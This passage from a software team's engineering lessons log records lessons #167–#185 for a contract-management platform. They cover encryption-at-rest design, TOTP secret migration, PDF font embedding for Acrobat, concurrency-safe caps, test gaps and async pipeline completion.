**Fix:** Any agent parser that demands JSON must (1) strip ``` fences before parsing, (2) fall back to a prose-extraction path if parsing still fails, (3) never re-raise — log and degrade to `{response: raw_text, citations: []}`. The model's exact output format is never guaranteed.

### Lesson #167 — When wiring a new consumer to an existing Celery `getJobStatus` poller, verify the result-nesting level end-to-end
**Problem:** Chat read `status.result.response`, but `get_job_status` double-wraps (`{ result: <task-return> }` and the task returns `{ result: <agent> }`), so the real payload is `status.result.result.response`. Chat had read the wrong level since it was first written — never caught because no test exercised the full async path; it surfaced only in 7.27 Phase E.
**Fix:** When adding a consumer to a shared job poller, manually run the polling once end-to-end and confirm the result shape matches what the consumer reads (`status.result?.result ?? status.result` is the safe unwrap that matches the legal-documents poller).

### Lesson #168 — Migration timestamp collisions don't cause TypeORM to silently skip, but they signal sloppy hygiene and create undefined ordering between same-timestamp migrations
TypeORM keys its migrations-table tracking on class name + timestamp, not the bare numeric timestamp. So two migration files at `1755000000001-AddLegalCorpus.ts` and `1755000000001-SeedUploadExtractionMeterDefinition.ts` will BOTH run and BOTH get recorded — distinguished by class name in the migrations table. No silent skip. **However**, the execution ordering between same-timestamp migrations is undefined (TypeORM resolves the tie by load order, which happens to be alphabetical in practice, but this is implementation detail not contract). Same-timestamp migrations also signal sloppy hygiene and confuse reviewers. **Prevention:** before adding any new migration, list existing filenames and pick a timestamp strictly greater than the largest existing one: `ls backend/src/database/migrations/ | sort | tail -3`. Caught in Phase 7.27 — the legal-corpus migrations were drafted with timestamps colliding with already-applied metering migrations. Diagnosed because Youssef flagged the collision in code review and verified by running migration:run on a fresh DB rather than inferring TypeORM behavior.

### Lesson #169 — First encryption-at-rest primitive: AES-256-GCM with a self-contained payload, random IV per call, and a fast-hashed key that MUST be high-entropy
Built `CryptoService` (`backend/src/common/utils/crypto.ts`, PR #73) as the codebase's FIRST encryption-at-rest utility — the prerequisite for storing ERP credentials (Phase 7.28). Design lessons worth keeping: **(1) AES-256-GCM with a self-contained payload** `v1.<iv>.<tag>.<ciphertext>` (base64url) — the IV and the GCM auth tag travel inside the stored value, so decryption needs only the stored string + the key; the `v1.` prefix reserves room for a future algorithm rotation without ambiguity. **(2) Random IV per call** via `randomBytes(12)` INSIDE `encrypt()` on every invocation — never a constant, class field, constructor value, argument, or value derived from the plaintext. IV reuse under the same key breaks GCM's confidentiality AND authentication guarantees; this is the single most important invariant of the whole util. **(3) The auth tag is verified on decrypt** (`setAuthTag(tag)` before `decipher.final()`); a tampered ciphertext/tag or a wrong key makes `final()` throw, and that throw is rethrown LOUDLY with a generic message — NEVER caught-and-swallowed into a `null`/`''`/ciphertext return. **(4) The key is SHA-256-derived to 32 bytes — a FAST hash, deliberately NOT a slow KDF (scrypt/argon2).** That is correct ONLY because the input is a high-entropy machine secret, not a human password. The operator-facing consequence: `ERP_CREDENTIAL_ENC_KEY` MUST be a high-entropy random value (`openssl rand -base64 48`), NEVER a memorable passphrase — a guessable phrase is brute-forceable against a fast hash. `.env.example` steers to the generator command and explicitly warns against passphrases. **(5) The key is read via ConfigService** (never `process.env`, never a hardcoded fallback) and is `.optional()` at boot so the app starts without it, but `encrypt`/`decrypt` throw a clear, var-named error the moment they are called while it is missing or below the 32-char floor. No key material or plaintext ever appears in logs or error messages. The same util can later encrypt the currently-plaintext `users.mfa_totp_secret` and the DocuSign RSA private key (tracked as task 7.35).

### Lesson #170 — Org-scoped (direct `organization_id`) is NOT contract-scoped — the Option B lint chokepoint guards only the 24 contract-rooted entities; cross-tenant admin on an org-scoped table is made safe by role-gate + reason-required audit, not a repository wall
Phase 7.28 v1.1 added a SYSTEM_ADMIN cross-tenant ERP control surface (suspend / unsuspend / force-check / guarded-delete across any org's connections). The instinct was to ask "does the `no-bare-contract-repo-access` lint require a `// lint-exempt:` here?" The answer is no, and the reasoning is the lesson: the Option B chokepoint enforces the canonical `contract → project → organization_id` tenancy gate ONLY for the 24 **contract-rooted** entities (the ones reachable through that chain). `erp_connections` carries `organization_id` DIRECTLY — it is org-scoped, not contract-scoped — so it is outside the chokepoint's remit entirely; no wall applies and no exemption is needed. The correct tenancy safety for cross-tenant admin authority on an org-scoped table is the SAME model the existing `admin-organizations.service` uses: a SYSTEM_ADMIN **role-gate** + a **reason-required, immutably-audited** action (state + audit in one transaction), with the customer notified. **Verify before assuming the chokepoint applies:** run the contract-repo lint gate (`npm run lint:contract-repo`) and confirm exit 0 with no exemption added — if the entity isn't contract-rooted, the lint never had an opinion about it. Don't reach for `// lint-exempt:` to silence a rule that was never going to fire. (Phase 7.28 v1.1; finding #0 of the implementation.)

### Lesson #171 — Notify-on-delete ordering: resolve recipients BEFORE the hard delete, dispatch AFTER it commits
Phase 7.28 v1.1 added a customer notification when an operator REMOVES an ERP connection. The ordering matters and is non-obvious. If you dispatch the notification first, you can notify for a delete that then fails (false alarm). If you wait until after the delete to look up who to tell, the row — and its org linkage — is already gone, so you have no recipients to resolve. The correct sequence is: **(1) resolve the recipients (the target org's OWNER_ADMINs) while the row/org linkage is still intact, (2) perform the hard delete, (3) only after it commits, dispatch to the recipients you captured in step 1.** Keep the dispatch **best-effort** (try/catch, never re-throw) so a notification failure never rolls back a delete that already succeeded — the delete is the source of truth, the notification is a side effect (the lesson #114 never-throw-on-notify discipline). This generalizes to any "notify about a destructive action on a row that owns the recipient linkage."

### Lesson #172 — Migrating a LIVE-AUTH secret to encryption-at-rest without locking users out: version-prefixed dual-read + a forward-only, key-guarded, idempotent migration
Phase 7.35 (PR #88) encrypted the plaintext `users.mfa_totp_secret` at rest via `CryptoService`. The danger with a live-auth secret is NOT data loss — it is **lockout**: if the decrypt-on-read code is live while a row is still plaintext (migration hasn't run yet, ran after the app booted, a secret was enrolled in the gap, or a non-Docker deploy), a naive `decrypt(plaintext)` throws → MFA verify fails → the user is locked out. Two controls make the conversion safe, and both are mandatory:

**(1) Version-prefixed DUAL-READ on every read path.** CryptoService payloads start with a marker (`v1.`). The read helper decrypts ONLY when the stored value starts with that marker; anything else is treated as legacy plaintext and returned as-is: `stored.startsWith('v1.') ? decrypt(stored) : stored`. This makes reads tolerant of BOTH states, so the order of (code deploy vs data migration) can never lock anyone out. Route every real read through the one helper (here: `verifyMfa` login + `enableMfaTotp` enroll-confirm), guarding null BEFORE the helper so it's never called with null. This is the single most important detail — without it the change is genuinely dangerous.

**(2) Forward-only, key-guarded, idempotent data migration.** Select ONLY not-yet-converted rows (`WHERE secret IS NOT NULL AND secret NOT LIKE 'v1.%'`) so re-runs and half-completed runs never double-encrypt. Encrypt via the SAME `CryptoService` (construct it in the migration with a `process.env` ConfigService shim — data-source.ts loads dotenv before migrations run; never reimplement AES-GCM in SQL). Order the loop so `encrypt()` (which validates the key and throws if it's missing/short) runs BEFORE the `UPDATE` — so a missing key aborts with **zero rows modified** (do-no-harm), and a 0-row DB is a clean no-op that doesn't require the key. `down()` is a logged no-op: reverting at-rest encryption to plaintext is a security regression, so the migration is intentionally irreversible.

Side effects worth flagging at ship time: encrypt-on-write must **hard-fail** (throw) when the key is absent rather than silently storing plaintext, which makes the encryption key **functionally required** for that feature's write path in every environment (here, MFA enrollment now requires `ERP_CREDENTIAL_ENC_KEY`). And reusing one key across consumers (ERP credentials + MFA TOTP) means losing/rotating it makes BOTH undecryptable — a re-encryption migration is required before any rotation. Verification that actually proves safety needs a real-Postgres test (convert + idempotent re-run + already-encrypted-untouched + key-missing-throws-zero-rows) plus unit tests proving the dual-read accepts legacy plaintext — mocked-only tests would hide the lockout risk (lesson #135 / #140).

### Lesson #173 — Asserting a watermark (or any text) is really in a pdfmake 0.3.x PDF: FlateDecode + hex-encoded TJ tokens defeat a naive `buffer.includes()`
Verifying that a watermark — or any drawn text — actually made it into a pdfmake-generated PDF is non-trivial, and a naive `buffer.includes(email)` (or `buf.toString().includes(...)`) returns **false even on a CORRECT watermark**, so the test reads as "stamp absent" when the stamp is really there. Two layers defeat the substring search: **(1)** pdfmake 0.3.x compresses page content streams with **FlateDecode** (zlib), so the drawn text is not in the raw bytes at all; and **(2)** inside the inflated stream, pdfkit writes text as **hex-encoded strings inside TJ show-text arrays** (e.g. `[<5369676e20> ...] TJ` = `"Sign "`), frequently **kerning-split** across several `<hex>` tokens — so even after inflation a literal substring won't match. To assert text presence reliably: byte-scan every `stream`…`endstream`, `zlib.inflateSync` each body (skip the non-Flate ones), then regex out every `<hex>` token, hex-decode and concatenate, and search the reconstructed string (a pure-ASCII email like the guest watermark survives this, since the doc's default Helvetica is a non-subsetted standard-14 font rendered as WinAnsi). The watermark itself rides on pdfmake's native top-level `watermark` property (auto per-page), so a per-page presence check is one decode away. Surfaced verifying the guest-download watermark `CONFIDENTIAL — <guest email> — <time>` (PR #94, merged `99f431d`). **Cross-reference lesson #140 (mock-blindness):** the pre-existing export tests mocked the pdfmake primitive (`createPdfBuffer`), so they could prove the `docDefinition` carried the `watermark` key but NOT that it was actually rendered — only a **no-mock, byte-level** assertion against real pdfmake output proves the watermark is genuinely drawn. The reusable helper pair (`extractStreams` → inflate → decode `<hex>` TJ tokens) now lives in `export.service.watermark.spec.ts` and `guest-download.controller.real-pg.spec.ts`.

### Lesson #174 — Acrobat strict-rejects fontkit's minimal subset (`sfntVersion 'true'`, missing `cmap`/`name`/`post`/`OS/2`) while qpdf / fontTools / Chrome accept it — fix the Amiri embed by writing the FULL TTF + a `/CIDToGIDMap` stream, and route pure-Latin chrome to base-14 Helvetica
pdfkit's default font-embedding pipeline goes through `fontkit.TTFSubset.encode()`, which produces a stripped subset font with `sfntVersion = 'true'` (Apple TrueType magic, NOT the standard 0x00010000 Windows/OpenType magic) and only 7 tables (head, hhea, loca, maxp, prep, glyf, hmtx) — MISSING the OpenType-required `cmap`, `name`, `post`, `OS/2`. **Lenient parsers (qpdf `--check`, fontTools, Chrome's PDF viewer, pdf.js for normal-sized subsets) all accept this minimal subset and report "clean."** Adobe Acrobat strict-parses the FontFile2 and either crashes outright (memory corruption surfaces in whichever subsystem Acrobat runs next — for real-world Arabic exports with many subset glyphs, that was `CTJPEGReader` / Font Capture, an `EXCEPTION_ACCESS_VIOLATION`) or renders glyph data incorrectly (a visible garbled footer like `Įeįerated by Sİıį PlatĲorĳ` was the SAME defect surfacing as wrong glyph indexing, not a crash). **The fix has two layers and you need both.** Layer 1: stop using fontkit's subset encoder. A module-init monkey-patch on pdfkit's internal `EmbeddedFont.embed` (find the class via a throwaway `new PDFDocument` + `registerFont()` + `doc.font(name)` + `doc._font.constructor` probe) substitutes `subset.encode()`'s output for the FULL TTF buffer (Acrobat-valid `sfntVersion 0x00010000` + all 15 tables present) AND replaces pdfkit's `/CIDToGIDMap = /Identity` with a STREAM built from `fontkit.Subset.glyphs[]` (2-byte big-endian per subset gid, mapping subset gid → original full-font gid). Content-stream gids stay SMALL (subset numbers); Acrobat reads them, consults the `/CIDToGIDMap` stream, fetches the correct glyph from the spec-valid embedded full font — visually byte-identical to the fontkit measurement step that drove layout (verified end-to-end: walked 24 distinct shaped Arabic glyphs against the full Amiri TTF, 0 outline mismatches). Layer 2: route all pure-Latin chrome (footer, page numbers, brand, English meta labels) to PDF base-14 Helvetica (Type1 AFM, `/WinAnsiEncoding`, NEVER embedded — Helvetica is referenced by name in any standards-compliant PDF reader). Helvetica never goes through `EmbeddedFont` at all, so it's structurally immune to the Acrobat-strict crash class. Set `defaultStyle: { font: 'Helvetica' }` on every docDefinition; mark Arabic-script inlines explicitly `font: 'Amiri'` and Latin sub-runs inside an Arabic-bearing line explicitly `font: 'Helvetica'`. **Trade-off accepted:** PDF size grows by the full TTF (~500 KB per Arabic export for Amiri-Regular + Amiri-Bold). Latin-only PDFs are unaffected because Helvetica is base-14 and embedded by reference. **Regression guard (RED-first):** assert every embedded `FontFile2` in the rendered PDF has standard `sfntVersion 0x00010000` AND all 10 OpenType-required tables (`cmap` / `head` / `hhea` / `hmtx` / `maxp` / `name` / `post` / `OS/2` / `glyf` / `loca`). The same assertion logic run against pre-fix output reported 4 failures (both Amiri subsets had `sfntVersion 'true'` + missing tables); on the post-fix render it passes. **Shipped 2026-06-24, PR #97, squash-merge `f3f1c5f` on `main`.** Helper code: `backend/src/common/utils/pdf-arabic.ts` (the monkey-patches are IIFEs at the top of the file — install once at first import, idempotent across hot-reload via boolean flags on the pdfkit prototypes).

### Lesson #175 — In-container "clean" PDF inspection tools repeatedly disagreed with the real downloaded file's behavior in Acrobat — trust the real reader, not the in-container tool, and chase the gap when they disagree
During the Acrobat-strict diagnosis the in-Docker tools (`qpdf --check`, `pdfcpu validate`, `mutool clean`, fontTools `subset.py`, pdfjs's extractor, poppler's `pdftotext`, MuPDF's `mutool draw`) all unanimously reported "clean structure / no errors" against the exact PDF bytes the user was downloading and opening — and Acrobat crashed on those exact bytes anyway. The first instinct in that mismatch is to keep looking for ways the inspection might be wrong (transport corruption? old code state? wrong file?). All ruled out. The right answer was: the inspection tools have **lenient font-parsers** and Acrobat doesn't. They are correct that the PDF structure is well-formed; they are blind to the SPECIFIC class of defect (sfntVersion + missing OT tables) that Acrobat strict-rejects. **The diagnostic discipline:** when an in-tooling check and a real-reader check disagree about the SAME PDF bytes, treat the real-reader behavior as ground truth and treat the in-tooling "clean" verdict as evidence the tooling cannot see what's breaking. Don't keep re-running the same tool with different flags hoping it eventually catches what it's blind to. The user's pushback was the unlocking observation — "stop trusting the in-container render; chase the gap between what you inspect and what I download." Within an hour of taking that seriously, the actual defect was found by dumping the raw FontFile2 bytes and inspecting the OpenType table directory by hand — a thing no inspection tool reported because every tool tolerates a minimal subset. **Generalization beyond PDFs:** any time a green local/CI/in-tooling check disagrees with the real production-environment behavior on identical bytes, the tool is the suspect, not the bytes. Real-environment verification is the canonical gate (cf. lesson #135 staging-gate posture, lesson #140 no-mock integration tests). Visual eye-test in real Acrobat was the only thing that closed PR #97 — both ways: it surfaced the bug (the user's pre-fix crash + footer garble screenshots), and it confirmed the fix (the post-fix open-in-Acrobat "no crash, Arabic correct, footer correct, copy/paste works"). **Reference:** PR #97 (Arabic PDF rendering), companion lesson to #174.

### Lesson #176 — External-binary test dependencies (qpdf, ffmpeg, imagemagick, pdftotext, …) must be gated behind a robust presence check or CI false-fails on every runner that doesn't install them
The structural-validity guard in `export.service.arabic.spec.ts` shells out to `qpdf --check` to verify the rendered PDF passes a strict-validator pass. The author's local dev container had qpdf installed, so the test passed locally. CI's `ubuntu-latest` backend job runs `npm ci` + `lint:contract-repo` + `npm test` — **no `apt-get install qpdf`** — so on CI the `execSync('qpdf --check ...')` threw `ENOENT` and the catch block set `qpdfFailed = true`, which the assertion `expect(qpdfFailed).toBe(false)` then false-failed. CI logged only `Expected: false / Received: true` with no hint that the underlying cause was a missing binary — the test had already swallowed the error message into `qpdfOut`. **Fix shape that's actually robust on both Linux and Windows:** probe presence with `spawnSync('qpdf', ['--version'], { stdio: ['ignore', 'pipe', 'pipe'] })` — **without a shell**. Node calls `execvp` / `CreateProcess` directly, so a missing binary produces a real `error.code === 'ENOENT'` on the result object on BOTH platforms. (`execSync` on Windows goes through `cmd.exe`, which wraps `ENOENT` as the shell's "is not recognized as an internal or external command" string — losing the structured error code; you'd be stuck doing fragile substring matching on the shell's locale-dependent error message.) Gate the assertion specifically on `error.code === 'ENOENT'`, NOT on any throw: that distinction is mandatory — "qpdf present but failed `--version`" must stay in the run branch so a broken qpdf install still surfaces as a loud failure on the real check. When the binary IS missing, `console.warn` a clear message ("qpdf not found on PATH — skipping external --check; in-process invariants still enforced") and skip ONLY the external assertion; the in-process invariants (operator balance, BDC === EMC, marked-content depth, `/ActualText` payload shape) ALWAYS run regardless. The skip is reserved EXCLUSIVELY for the binary-missing case — never a catch-all "any throw means skip." Same shape applies to any test that depends on a system binary (`ffmpeg`, `imagemagick`, `pdftotext`, `poppler`, `tesseract`, `jq`, `docker`). **Don't skip the test entirely:** the in-process invariants stay loud; only the external-binary assertion is conditional. **Don't install the binary on the CI runner as the default fix:** that's also valid (and stronger), but the test then becomes a hard CI dependency that someone has to remember to maintain in every workflow file forever. Gating in the test is the lower-coupling default. **Caught in PR #97's CI run 28088681550 against commit `e4d1a000`; fixed in commit `3c595db` on the same PR.**

### Lesson #177 — Never hold a lock (advisory/row) across a HEAVY operation to enforce a counter/cap — it pool-starvation-deadlocks under concurrency; use an atomic conditional UPDATE instead
Feature #4 (guest upload, PR #96) needed a race-safe daily cap (5 guest uploads/day per contract) enforced at the route layer, because the metering engine has no per-day window. The FIRST mechanism took a per-`(contract, UTC-day)` `pg_advisory_xact_lock` inside a `dataSource.transaction()`, then — STILL holding that transaction's pooled connection — `await`ed the heavy `uploadAndProcess` (storage write + the metering `reserve` which opens its OWN `dataSource.transaction()` + repo saves + a synchronous AI-backend HTTP POST). It passed a 6-concurrent real-PG test and looked correct. **It would have deadlocked the entire backend instance under ≥ pool-max concurrent same-contract uploads.** The failure mode: each waiter pins a pooled connection to run the BLOCKING `pg_advisory_xact_lock` (not `pg_try_*`); with pg's default `max: 10` and `connectionTimeoutMillis: 0` (wait forever), 9 waiters + 1 winner check out all 10 connections; the winner then needs an 11th connection (for findInOrg / the reserve sub-transaction / the save / the AI HTTP) to FINISH and release the lock — but the pool is exhausted by the waiters, who are waiting on the lock the winner holds. Circular wait → every request hangs forever, not just guest uploads (shared pool). A slow AI backend widens the hold window and makes it easier to hit. **Why the test didn't catch it:** the concurrency test stubbed `uploadAndProcess` with a single `dataSource.query` INSERT (one extra connection, no reserve sub-transaction, no AI HTTP) and fired only 6 attempts — peak ~7 connections, under `max: 10`. A low-concurrency test with a lightweight stub structurally cannot reproduce pool starvation. **The fix (the codebase's own Rule 9 Invariant 2 idiom):** replace the held-lock-across-heavy-op with a SINGLE atomic conditional UPSERT on a dedicated counter row — `INSERT INTO guest_upload_daily_counts (contract_id, day, count) VALUES ($1,$2,1) ON CONFLICT (contract_id, day) DO UPDATE SET count = count + 1 WHERE guest_upload_daily_counts.count < $3 RETURNING count` — 0 rows returned = capped. The row lock lives only for that one statement; NOTHING is locked across the heavy `uploadAndProcess`. A claimed slot is released (best-effort, `count = count - 1 WHERE count > 0`) if the upload throws before a document lands (fail-safe toward over-denial). **The generalization:** to enforce a cap/counter under concurrency, make the count-and-claim a single atomic statement (conditional UPDATE / INSERT…ON CONFLICT…WHERE…RETURNING) and do the heavy work AFTER the claim, outside any lock — never `await` I/O, additional pool-connection checkouts, or sub-transactions while holding a lock acquired to gate the cap. **Caught by Claude Code's own adversarial self-review on PR #96** (a 4-dimension review run after the first mechanism passed its concurrency test); the deadlock-fix is commit `6083b4b`, the race-safe 6-concurrent→exactly-5 proof re-ran green on the new mechanism.

### Lesson #178 — A frontend change "missing" in the browser is often a stale Vite bundle or a cached browser tab, NOT a code defect — force-recreate the container AND hard-refresh before "fixing" code; and an i18n-mocked component test that asserts the KEY STRING can't catch a missing translation
PR #96 added an "Upload new version" button to `GuestContractView` beside the existing watermarked-download button (same `{guestJwt && …}` cluster, same Path-B gate). A browser check reported the Download button rendering but the Upload button "missing" — specifically in Arabic. The instinct is a render-throw or an RTL layout bug. It was neither: the **running Vite dev server was serving a PRE-change bundle** (the download button pre-existed from feature #3 on `main`; the upload button was only in the new commit, which the dev server / browser hadn't picked up). The component on disk was correct — proven two ways without touching code: (1) the component test renders the real `GuestContractView` and `getByText('guest.upload.button')` PASSES; (2) all three locale JSONs contain the `guest.upload.*` keys and parse valid. **Claude Code correctly refused to "fix" code that had no defect** and instead reported the contradiction (code renders it; browser doesn't) with the diagnosis. **Diagnostic discipline for "my frontend change isn't showing":** before concluding a code/RTL bug, (a) `docker compose up -d --force-recreate <frontend>` to rebuild the dev bundle, AND (b) hard-refresh / open a fresh Incognito window — these are TWO SEPARATE caches (container-side Vite bundle + browser-side HTTP cache), and clearing only one leaves the stale artifact in the other. If after a clean restart + hard refresh it still doesn't render, THEN it's a code bug. **Corollary test-gap (important):** a component test that mocks i18n as `t: (k) => k` and asserts on the KEY STRING (`getByText('guest.upload.button')`) will PASS even if that locale value is genuinely missing from `common.json` — it proves the element renders, NOT that the translation resolves. Such a test cannot catch a missing/typo'd translation key. To guard the actual localized label (e.g. the Arabic string really shows), a test must render with REAL i18n resources and assert the resolved value — or accept that the real browser pass is the only gate for label correctness. (PR #96; the "no Arabic upload button" symptom was a stale bundle confirmed after a container force-recreate + hard refresh, not a code defect.)

### Lesson #179 — A crypto round-trip test must encrypt AND decrypt through ONE key/instance (the production DI CryptoService) under a real production-shaped key — a hand-rolled second instance pinned to a dummy key verifies nothing
The ERP integration test "credentials are encrypted at rest, decrypt back, and are never returned" (PR #100) ENCRYPTED through the DI `CryptoService` (via `ErpConnectionService.create`) but DECRYPTED through a SECOND, hand-rolled instance — `new CryptoService({ get: (k) => k === 'ERP_CREDENTIAL_ENC_KEY' ? ENC_KEY : undefined })` — pinned to the test's 42-char dummy. The two instances resolved DIFFERENT keys, and the test's pass/fail flipped on an environment detail rather than on correctness:
- **`@nestjs/config` gives `process.env` precedence over `load()` values unless `ignoreEnvVars: true`.** `ConfigService.get()` resolves validated-env → `process.env` → `load()` internal config. So when the container had a real `ERP_CREDENTIAL_ENC_KEY`, the ENCRYPT path used the *real env key* while the hand-rolled DECRYPT used the *dummy* → GCM auth-tag mismatch (`"authentication failed (payload tampered or wrong key)"`) → deterministic failure. When the env key was ABSENT, encrypt also fell back to the same `load()` dummy → both matched → green **for the wrong reason** (the assertion never exercised real encryption-at-rest). A force-recreate that populated the real key (for the Phase 7.35 MFA work) is what flipped this test green→red and exposed it — reported by Youssef on an unrelated gated check.
- **Fix (test-only):** decrypt through `moduleRef.get(CryptoService)` — the SAME DI singleton the production path encrypts with — so both directions share one `ConfigService`/key. The round-trip is then verified under whatever key is actually in effect (the real env key when set, else the dummy), and the two paths can NEVER diverge. Proven by running the spec both WITH a real env key distinct from the dummy (the condition that exposed the bug → now passes) AND with no key (dummy → passes).
- **General rule:** a crypto round-trip assertion must use ONE key/instance for encrypt+decrypt — ideally the production DI instance — and should run under a real production-shaped key (≥ the real entropy floor). A test that is green only because the key is absent/dummy, or red only because two key sources diverge, proves nothing about the real round-trip. Production code was sound and untouched here (prod has a single key source); the defect was purely the test's second instance. (PR #100.)

### Lesson #180 — A feature that CALLS an existing pipeline entry point is not necessarily COMPLETE — dispatch ≠ completion; verify end-to-end against real runtime state, not by reading that the call is wired
A guest feature (guest AI extraction on a new-version upload) *looked* done because the guest upload path called the existing `DocumentProcessingService.uploadAndProcess` — the same entry point the managing upload uses — so "the pipeline is invoked" read as "the pipeline completes." A **runtime audit against real DB state** (not code-reading) found the opposite: 5/5 guest uploads were silently stuck at `EXTRACTING_TEXT`/`EXTRACTING_CLAUSES`, 0 clauses, reservations refunded by the sweeper. The reason is the gap the lesson names: `uploadAndProcess` only **dispatches** the async AI pipeline; **nothing DROVE it to completion for a guest**. The pipeline is poll-driven, and the only thing that advanced a doc to terminal was the managing status route (`GET /contracts/:id/documents/:docId/status` → `pollAndAdvance`), walled by `findInOrg` — which a guest's null org can never pass. So dispatch happened, completion never did. **The discipline:** "calls the pipeline" ≠ "completes the pipeline." For any feature that hands work to an async/poll-driven pipeline, the acceptance check is the **terminal artifact in real runtime state** (clauses written, status terminal, reservation committed) — observed by querying the running system, NOT by confirming the dispatch call is wired and NOT by a test that **stubs the pipeline and asserts only that dispatch was CALLED** (that proves nothing about completion — same family as mock-blindness #140, and the #135 staging-gate posture that a green stubbed test is not end-to-end proof). Here the verdict came from `docker exec … psql` against `document_uploads` + `metering_ledger`, which is what made the gap undeniable. (Surfaced during a Slice-1 guest-extraction audit; the completion fix — a server-side driver + race-safe advance — is in flight in PR #99 and will get its own lesson when it lands.)

### Lesson #181 — A dependency added to package.json in one PR is NOT in long-running containers' node_modules until `npm install` — it phantom-fails UNRELATED suites for anyone who pulls without re-installing; diagnose by error class (missing-module = env, not your diff) and never "fix" it by re-adding the dep to your feature PR
`bidi-js` was added to `backend/package.json` in PR #97 (the Arabic-PDF Acrobat fix). A later contributor working on an unrelated branch, on a backend container that had been up for ~21h, saw **13 test suites fail** — `export`, `portfolio-export`, `docusign`, `pdf-arabic`, `guest-download` — all with `Cannot find module 'bidi-js' from 'common/utils/pdf-arabic.ts'`, even though their diff touched none of those files. The container's anonymous `node_modules` volume predated PR #97, so the declared dep was simply not installed; `tsc`/`lint`/the touched suites were green, and only the suites that transitively import `pdf-arabic.ts` blew up. **Diagnosis by error class:** `Cannot find module '<declared-dep>'` in suites you didn't touch = an ENVIRONMENT/stale-install problem, NOT a defect in your change — confirm the dep IS in `package.json` (it was, since PR #97), then it's a missing install, not missing code. **Fix:** `npm install` (or `docker compose up --force-recreate --renew-anon-volumes …` for the anonymous-volume case) — and crucially, **do NOT "fix" it by adding the dependency in your feature PR** (it's already declared on `main`; re-adding it is a spurious, confusing diff). The team rule: after pulling a PR that adds a dependency, run `npm install`. This is the cross-contributor variant of the existing "Stale node_modules after git pull" Known Issue (CLAUDE.md Known Issues #5) and the older joi/`--renew-anon-volumes` gotcha (Phase 1.5) — same root (stale node_modules), but the new angle is *someone else's* dep-adding PR phantom-failing *your* unrelated run. (Surfaced twice on the guest-extraction branch; cleared each time by `npm install bidi-js` in the container — never by touching the feature PR.)

### Lesson #182 — A long-running async pipeline cannot be driven to completion by a BROWSER poll — completion must never depend on a client tab staying open; use a SYSTEM-run server-side driver
Slice 1 of guest AI extraction (PR #99, merged `77ba6c4`) was the completion fix promised by lesson #180. The first completion mechanism made the GUEST'S BROWSER the thing that drove the poll-driven AI pipeline to terminal — the guest status page polled a guest-gated status endpoint (the analogue of the managing `pollAndAdvance`) on a 120s cap. But the AI clause-extraction wall-clock is ~256s, so **the browser poll gave up ~2.5 min BEFORE the AI job finished** → the doc never advanced → the same 5/5-stuck-at-`EXTRACTING_CLAUSES` symptom lesson #180 diagnosed, now for a different reason (poll cap < job time, instead of no-driver-at-all). The deeper point: a browser tab is an unreliable executor — it can close, refresh, navigate away, sleep, or time out before a multi-minute job completes, and then the work is **permanently stuck** with nothing to resume it. **Fix:** a SYSTEM-run server-side driver — a Bull scheduler (`DocumentExtractionScheduler`) that periodically advances ANY in-progress doc to terminal independent of any client — owns completion; the browser poll is demoted to **display-only** (it reflects state, it does not drive it). This applies to the managing side too: completion of any async pipeline must be guaranteed by a server-side actor, never by a client staying on the page. **The rule:** if the only thing advancing an async job is a client poll, the job is one closed tab away from being stuck forever — put a SYSTEM driver behind it and let the client poll be cosmetic. (Same family as #180 dispatch≠completion; #182 is the "and the driver itself must be server-owned" corollary.)

### Lesson #183 — A test that fakes the AI/dependency or collapses the time dimension proves the happy path while the real-world edge (timing, result-expiry) silently breaks — for long-poll/async-completion code, test the not-ready and expired-result paths
The Slice 1 real-Postgres tests (PR #99) faked `AiService.getJobStatus` to return `'completed'` INSTANTLY. That proved the advance LOGIC correct — exactly-once clause write, reservation commit, status transition — and 17 tests passed. But by collapsing the time dimension to zero it never exercised two real-world edges: (a) the race between a client poll's cap and the AI's actual wall-clock (the #182 bug — the test's instant-complete can never reproduce "poll gives up before job finishes"); and (b) the **Celery "unknown / expired task → PENDING forever" gotcha** — once a Celery result TTL expires, `getJobStatus` reports `pending` indefinitely, indistinguishable from "still running." Edge (b) is vicious here: the SYSTEM driver built to RESCUE stuck docs would itself, on an expired-result doc, **poll forever and never self-terminate** — the rescuer becomes a new permanent-stuck source. **Neither the 17 passing tests nor code-reading caught it — adversarial review did**, by asking "what does `getJobStatus` return when the result has expired?" **Fix:** a staleness backstop that atomically FAILs + refunds any in-progress doc stuck beyond a max window (so an expired/never-arriving result becomes terminal-FAILED, not eternal-PENDING). **The discipline:** a test that fakes the dependency or returns instant-success proves the happy path while the timing/expiry edge silently breaks — same family as mock-blindness (#140) and dispatch≠completion (#180). For long-poll / async-completion code, the not-ready path AND the expired-result path are the tests that matter; an instant-`completed` stub tests neither. (The exactly-once-via-atomic-conditional-transition guarantee Slice 1 relies on is the #177 idiom — not re-banked here.)

### Lesson #184 — An Arabic clause-extraction golden set must enumerate ALL real clause markers (e.g. `الفقرة`), not just `مادة` — a heading-only lister silently under-counts, and the model is right
Building the Phase 8.1 accuracy golden set, the structural lister keyed on the `مادة`/`البند`/`Article` boundary regex and produced **37** articles. The live `claude-sonnet-4-6` baseline then extracted **38** clauses, and the harness flagged the extra one as `spurious: ['38']`. It was NOT a model error: `الفقرة (38) الحق في التغيير` ("Paragraph 38: The Right to Vary") is a genuine substantive variation-orders clause that the source labels `الفقرة` (Paragraph), not `مادة` (Article) — so the heading-only lister missed it and the golden count capped at 37. The model was correct; the golden set was incomplete. **Discipline:** an Arabic legal golden set must enumerate clauses by EVERY real clause marker actually present (`مادة`, `البند`, `الفقرة`, `Article`, `Clause`, …), verified against the real text, not just the dominant marker. The harness surfaced the gap precisely because it tracks `spurious` **alongside** `verbatim fidelity`: the "extra" clause scored ~1.0 fidelity (real source text, not a hallucination), and **"spurious BUT high-fidelity" is the signal to re-check the golden set, not the model**. Golden corrected to 38 → boundary precision/recall/F1 = 1.0/1.0/1.0. (See `ai-backend/tests/accuracy/`.)

### Lesson #185 — Uncommitted work in a SHARED working directory can be silently knocked off its branch by another concurrent session — commit early, and re-verify branch state before every push
